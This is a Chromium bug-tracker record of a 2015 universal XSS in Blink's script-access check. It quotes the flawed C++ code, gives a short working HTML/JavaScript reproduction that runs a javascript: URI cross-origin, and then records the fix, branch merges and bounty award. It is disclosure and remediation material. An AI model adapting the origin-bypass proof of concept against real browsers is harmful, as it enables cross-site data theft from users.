# Security: Universal XSS by loading a javascript: URI from an unloaded window

| Field | Value |
|-------|-------|
| **Issue ID** | [40082715](https://issues.chromium.org/issues/40082715) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **Reporter** | ma...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2015-08-24 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

From /WebKit/Source/core/frame/DOMWindow.cpp:

---

bool DOMWindow::isInsecureScriptAccess(LocalDOMWindow& callingWindow, const String& urlString)  

{  

if (!protocolIsJavaScript(urlString))  

return false;

```
// If this DOMWindow isn't currently active in the Frame, then there's no  
// way we should allow the access.  
if (isCurrentlyDisplayedInFrame()) {  
    // FIXME: Is there some way to eliminate the need for a separate "callingWindow == this" check?  
    if (&callingWindow == this)  
        return false;  

    // FIXME: The name canAccess seems to be a roundabout way to ask "can execute script".  
    // Can we name the SecurityOrigin function better to make this more clear?  
    if (callingWindow.frame()->securityContext()->securityOrigin()->canAccessCheckSuborigins(frame()->securityContext()->securityOrigin()))  
        return false;  
}  

callingWindow.printErrorMessage(crossDomainAccessErrorMessage(&callingWindow));  
return true;  

```

}

---

|callingWindow| may be an unloaded window whose associated |frame()| holds another, potentially cross-origin document. As a result, the security check can be bypassed.

**VERSION**  

Chrome 44.0.2403.157 (Stable)  

Chrome 45.0.2454.46 (Beta)  

Chrome 46.0.2486.0 (Dev)  

Chromium 47.0.2493.0 (Release build compiled today)

**REPRODUCTION CASE**

<script>
var i = document.documentElement.appendChild(document.createElement('iframe'));
var f = frames[0].Function;
i.onload = function() {
f("location.replace('javascript:alert(location)')")();
}
i.src = 'https://abc.xyz';
</script>

## Attachments

- [exploit.html](attachments/exploit.html) (text/html, 243 B)

## Timeline

### np...@chromium.org (2015-08-24)

+ those who've touched this code recently.

jww -- Can you suggest an owner?

### cl...@chromium.org (2015-08-24)

[Empty comment from Monorail migration]

### ja...@chromium.org (2015-08-24)

I think this was http://src.chromium.org/viewvc/blink?view=revision&revision=188452.

When I moved isInsecureScriptAccess() from LocalDOMWindow to DOMWindow, I changed the last return false case from approximately:

if (callingWindow.document()->securityOrigin()->canAccessCheckSuborigins(frame()->securityContext()->securityOrigin()))

to:

if (callingWindow.frame()->securityContext()->securityOrigin()->canAccessCheckSuborigins(frame()->securityContext()->securityOrigin()))


This makes the logic more OOPIF-ish but isn't strictly necessary, since callingWindow is guaranteed to be a LocalDOMWindow, and therefore is tied to a Document in this process. Getting to the SecurityOrigin via frame()->securityContext() gives us the wrote origin, because frame() is not our frame anymore.

There are two ways to solve this: Ensure the callingWindow isn't detached, or return to the old LocalFrame-dependent logic. dcheng, any thoughts on which is preferable?

### dc...@chromium.org (2015-08-24)

Let's just return to the old LocalFrame-dependent version.

### ja...@chromium.org (2015-08-24)

Patch up: https://codereview.chromium.org/1311253005/

@marius.mlynski: Thanks for the easy-to-use repro!

### cl...@chromium.org (2015-08-24)

This medium+ severity security issue is a regression on trunk.

Please fix this asap. If you are unable to look into this soon, please revert your change.

- Your friendly ClusterFuzz

### bu...@chromium.org (2015-08-25)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201139

------------------------------------------------------------------
r201139 | japhet@chromium.org | 2015-08-25T17:20:32.461636Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/frame/DOMWindow.cpp?r1=201139&r2=201138&pathrev=201139
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow.html?r1=201139&r2=201138&pathrev=201139
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow-expected.txt?r1=201139&r2=201138&pathrev=201139

Use Document of callingWindow for access check in isInsecureScriptAccess()

The Document call was changed to Frame::securityContext() to make the code more
RemoteFrame-friendly. However, callingWindow is guaranteed local. Revert to
getting the SecurityOrigin via Document.

BUG=524074
TEST=http/tests/security/location-change-from-detached-DOMWindow.html

Review URL: https://codereview.chromium.org/1311253005
-----------------------------------------------------------------

### ma...@gmail.com (2015-08-25)

By the way, in case it matters in the patch merging process: this issue is present in all release channels, so the Security_Impact-* flag should be set to "Stable".

### ja...@chromium.org (2015-08-25)

Thanks for verifying. Best on how long ago I wrote the regression, I had guessed it was present everywhere, but it's good to be sure :)

This change is pretty low-risk, so I'm requesting merge to 45 and 46 right away. Happy to wait a few days to actually merge if that's preferable.

### pe...@google.com (2015-08-25)

[Automated comment] Reverts referenced in bugdroid comments, needs manual review.

### pe...@google.com (2015-08-25)

[Automated comment] Reverts referenced in bugdroid comments, needs manual review.

### cl...@chromium.org (2015-08-25)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

- Your friendly ClusterFuzz

### am...@google.com (2015-08-25)

Merge approved for M45 branch 2454.

Also approving for M46 branch 2490 (since it'll be in M45 and we can't regress back in M46).

### bu...@chromium.org (2015-08-25)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201159

------------------------------------------------------------------
r201159 | japhet@chromium.org | 2015-08-25T22:05:29.501179Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2454/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow.html?r1=201159&r2=201158&pathrev=201159
   A http://src.chromium.org/viewvc/blink/branches/chromium/2454/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow-expected.txt?r1=201159&r2=201158&pathrev=201159
   M http://src.chromium.org/viewvc/blink/branches/chromium/2454/Source/core/frame/DOMWindow.cpp?r1=201159&r2=201158&pathrev=201159

Merge 201139 "Use Document of callingWindow for access check in ..."

> Use Document of callingWindow for access check in isInsecureScriptAccess()
> 
> The Document call was changed to Frame::securityContext() to make the code more
> RemoteFrame-friendly. However, callingWindow is guaranteed local. Revert to
> getting the SecurityOrigin via Document.
> 
> BUG=524074
> TEST=http/tests/security/location-change-from-detached-DOMWindow.html
> 
> Review URL: https://codereview.chromium.org/1311253005

TBR=japhet@chromium.org

Review URL: https://codereview.chromium.org/1320513003
-----------------------------------------------------------------

### bu...@chromium.org (2015-08-25)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=201160

------------------------------------------------------------------
r201160 | japhet@chromium.org | 2015-08-25T22:07:33.287257Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2490/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow-expected.txt?r1=201160&r2=201159&pathrev=201160
   M http://src.chromium.org/viewvc/blink/branches/chromium/2490/Source/core/frame/DOMWindow.cpp?r1=201160&r2=201159&pathrev=201160
   A http://src.chromium.org/viewvc/blink/branches/chromium/2490/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow.html?r1=201160&r2=201159&pathrev=201160

Merge 201139 "Use Document of callingWindow for access check in ..."

> Use Document of callingWindow for access check in isInsecureScriptAccess()
> 
> The Document call was changed to Frame::securityContext() to make the code more
> RemoteFrame-friendly. However, callingWindow is guaranteed local. Revert to
> getting the SecurityOrigin via Document.
> 
> BUG=524074
> TEST=http/tests/security/location-change-from-detached-DOMWindow.html
> 
> Review URL: https://codereview.chromium.org/1311253005

TBR=japhet@chromium.org

Review URL: https://codereview.chromium.org/1320523002
-----------------------------------------------------------------

### cl...@chromium.org (2015-08-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-31)

Updating to stable impact, adding release labels and reward-topanel for VRP consideration (details here: https://www.google.com/about/appsecurity/chrome-rewards/)

### ti...@google.com (2015-08-31)

Congratulations - $7,500 for this report! Our finance team should be in contact within two weeks to collect your details for payment.

We'll credit you in our Chrome release notes tomorrow as "Marius Mlynski". Please let me know if you want to use a different name.

Any questions, either update the bug or reach out to me at timwillis@

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### ma...@gmail.com (2015-08-31)

Thanks, Tim. Please credit this issue and 522791 to "Mariusz Mlynski" (with the trailing "z" in the first name).

### ti...@google.com (2015-08-31)

All updated to "Mariusz Mlynski" (and I've made a note for future reports!)

### ti...@google.com (2015-09-04)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-09-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/374a6b30325dbf0d2821295b7d5bfbc41fbe6dad

commit 374a6b30325dbf0d2821295b7d5bfbc41fbe6dad
Author: japhet@chromium.org <japhet@chromium.org>
Date: Tue Aug 25 22:07:33 2015

Merge 201139 "Use Document of callingWindow for access check in ..."

> Use Document of callingWindow for access check in isInsecureScriptAccess()
> 
> The Document call was changed to Frame::securityContext() to make the code more
> RemoteFrame-friendly. However, callingWindow is guaranteed local. Revert to
> getting the SecurityOrigin via Document.
> 
> BUG=524074
> TEST=http/tests/security/location-change-from-detached-DOMWindow.html
> 
> Review URL: https://codereview.chromium.org/1311253005

TBR=japhet@chromium.org

Review URL: https://codereview.chromium.org/1320523002

git-svn-id: svn://svn.chromium.org/blink/branches/chromium/2490@201160 bbb929c8-8fbe-4397-9dbb-9b2b20218538

[add] http://crrev.com/374a6b30325dbf0d2821295b7d5bfbc41fbe6dad/third_party/WebKit/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow-expected.txt
[add] http://crrev.com/374a6b30325dbf0d2821295b7d5bfbc41fbe6dad/third_party/WebKit/LayoutTests/http/tests/security/location-change-from-detached-DOMWindow.html
[modify] http://crrev.com/374a6b30325dbf0d2821295b7d5bfbc41fbe6dad/third_party/WebKit/Source/core/frame/DOMWindow.cpp


### bu...@chromium.org (2015-09-24)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/374a6b30325dbf0d2821295b7d5bfbc41fbe6dad

commit 374a6b30325dbf0d2821295b7d5bfbc41fbe6dad
Author: japhet@chromium.org <japhet@chromium.org>
Date: Tue Aug 25 22:07:33 2015


### cl...@chromium.org (2015-12-02)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/524074?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082715)*
